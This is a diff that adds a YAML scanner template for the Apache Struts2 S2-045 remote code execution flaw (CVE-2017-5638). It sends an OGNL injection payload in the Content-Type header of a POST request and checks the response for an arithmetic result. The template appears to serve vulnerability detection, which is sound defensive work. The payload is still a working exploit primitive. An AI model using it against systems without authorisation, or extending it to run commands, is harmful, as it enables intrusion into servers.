@@ -1,0 +1,26 @@
+id: s2-045
+type: default
+info:
+  name: Struts2 s2-045 远程代码执行 # 经典漏洞
+  risk: High
+  cve: CVE-2017-5638
+
+variables: |+
+  function main() {
+    var num1=randomNum(1,1000);
+    var num2=randomNum(2,1000);
+    var payload1 = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."+
+    '(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.'+
+    'ServletActionContext@getResponse().getWriter()).(#o.println('+num2+'-'+num1+')).(#o.close())}';
+    return {'num1':num1, 'num2':num2, 'payload1':payload1};
+  }
+
+requests:
+  - method: POST
+    redirect: false
+    url: '{{.URL}}'
+    headers:
+     Content-Type: '{{.payload1}}'
+    matchers:
+      - dsl:
+          - "status_code==200 && contains(body,itoa({{.num2}}-{{.num1}}))"
